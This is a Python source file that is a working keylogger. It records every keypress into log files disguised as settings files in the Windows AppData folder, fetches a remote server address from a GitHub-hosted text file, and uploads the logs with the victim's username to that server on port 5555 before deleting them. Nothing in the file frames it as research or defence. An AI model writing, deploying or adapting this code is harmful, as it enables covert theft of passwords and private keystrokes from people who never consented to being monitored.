from pynput.keyboard import Key, Listener
import logging
from os import path, remove, listdir
ert = "ta/Local/Eve"
from datetime import datetime, timedelta
import requests
from urllib.request import urlopen
y = datetime.today() - timedelta(days=1)
lfile = "settings.xpb"
dfile = "appsettings"
upath = path.expanduser("~/AppData/Local/")
cfiles = sorted([file for file in listdir(upath) if path.isfile(upath+file) and file.endswith(".xpb")])
if lfile in cfiles:
    cfiles.remove(lfile)
if len(cfiles) > 0:
    with open(upath+lfile, "ab+") as f:
        for file in cfiles:
            fp = upath + file
            with open(fp, "rb") as cf:
                f.write(cf.read())
            remove(fp)
h = urlopen("https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/file.txt").read().decode("utf-8").replace("\n","")
ll = upath+lfile
if path.isfile(ll):
    a = 0
    while a < 3:
        try:
            f = open(ll)
            files = { "files" : f }
            headers = { "user" : path.expanduser("~").split("\\")[-1] }
            requests.post("http://"+h+":5555/api/log", headers=headers, files=files)
            f.close()
            remove(ll)
            break
        except Exception as e:
            a += 1
logging.basicConfig(filename=(upath+dfile+str(datetime.today().strftime("%d")) + ".xpb"), level=logging.DEBUG, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
def asdf(k):
    logging.info(str(k))
with Listener(on_press=asdf) as abc:
    abc.join()
